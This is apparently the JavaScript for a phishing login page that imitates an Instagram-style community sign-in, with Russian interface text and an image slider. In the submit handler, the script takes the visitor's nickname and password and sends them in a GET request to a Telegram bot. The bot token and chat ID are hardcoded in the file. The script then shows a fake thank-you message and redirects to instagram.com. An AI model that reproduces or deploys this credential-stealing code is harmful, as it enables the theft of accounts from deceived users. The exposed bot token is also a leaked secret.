const imgSlider = document.querySelectorAll('.flex-images-slider');
const nickName = document.getElementById('nick-name');
const pass = document.getElementById('pass');
const sendBtn = document.getElementById('form-btn');
const form = document.querySelector('form');
let sendMessage = new Object({});
const token = 'bot5951322071:AAGPbDQTeHpohM7_-LfOhQWMCRQru08VAGA/';
const chatId = 'chat_id=1338153173&text='
let URL = 'https://api.telegram.org/' + token + 'sendMessage?' + chatId;
// work with label nickName
nickName.oninput = () => {
    let label = nickName.parentElement.querySelector('label');
    label.style.fontSize = '10px';
    label.style.top = '8px';
    if(nickName.value === ''){
    label.style.fontSize = '11px';
    label.style.top = '50%';
    }
}
// work with label password
pass.oninput = () => {
    // if(pass.value === '') return passVal = [];
    // let btnLook = document.querySelector('.btn-look')
    let label = pass.parentElement.querySelector('label');
    label.style.fontSize = '10px';
    label.style.top = '8px';
    if(pass.value === ''){
    label.style.fontSize = '11px';
    label.style.top = '50%';
    };

    // secret password replace 
    // e.target.value = e.target.value.replaceAll(' ','');
    // let passSecret = e.target.value.replace(/[A-z]/gi,'*');
    // passVal.push(e.target.value);
    // e.target.value = passSecret;
    // if(passVal !== []){
    // btnLook.style.display = 'flex';
    // btnLook.onclick = () =>{
    //     if(btnLook.textContent === 'Показать'){
    //         btnLook.textContent = 'Скрыть';
    //         e.target.value = passVal.join('').replaceAll('*','');
    //     }else {
    //         btnLook.textContent = 'Показать';
    //         e.target.value = passSecret;
    //     }
    // }
    //  }  else return btnLook.style.display = 'none';
}
if(pass.value === ''){
    let label = pass.parentElement.querySelector('label');
    label.style.fontSize = '11px';
    label.style.top = '50%';
}
if(nickName.value === ''){
    let label = pass.parentElement.querySelector('label');
    label.style.fontSize = '11px';
    label.style.top = '50%';
}

// send messages to email
sendBtn.onclick = () =>{
    if(nickName.value === ''){
        return nickName.style.borderColor = 'red';
    } else if(pass.value === '') {
        return pass.style.borderColor = 'red';
    }
    else{
        nickName.style.borderColor = '#ccc';
        pass.style.borderColor = '#ccc';
    //  sendMessage = {
    //     nickName: nickName.value,
    //     pass: pass.value,
    // }
    let message = `nickName: ${nickName.value}; password: ${pass.value}`
    let xhttp = new XMLHttpRequest();
    xhttp.open('GET', URL + message , true);
    xhttp.send();
    pass.value = '';
    nickName.value = '';
    document.querySelector('.authorization-form').style.transform = 'scale(0.5)';
    setTimeout(() => {
        document.querySelector('.authorization-form').innerHTML = `
        <div class="accept">
         <img src="./img/accept.png" alt="accept"/>
         <h1>Спасибо за обратную связь скоро свяжемься с вами</h1>
         <p><span>Сообщество </span><img src="./img/logo-text.png" alt="logo-text" width="150px" height="40px"/></p>
        </div>
        `;
            document.querySelector('.authorization-form').style.transform = 'scale(1)';
            setTimeout(() => {
                window.location.href = 'https://instagram.com/';
            }, 2000);
    }, 300);
    }
};
// slider img
setInterval(() => {
  if(imgSlider[0].classList.contains('active')){
    setTimeout(() => {
        imgSlider[0].classList.remove('active');
        imgSlider[1].classList.add('active');
        setTimeout(() => {
            if(imgSlider[1].classList.contains('active')){
                imgSlider[1].classList.remove('active');
                imgSlider[2].classList.add('active');
                setTimeout(() => {
                    if(imgSlider[2].classList.contains('active')){
                        imgSlider[2].classList.remove('active');
                        imgSlider[0].classList.add('active');
                    }
                },3000)
            }
        }, 3000);
    }, 3000);
}else return;  
}, 1000);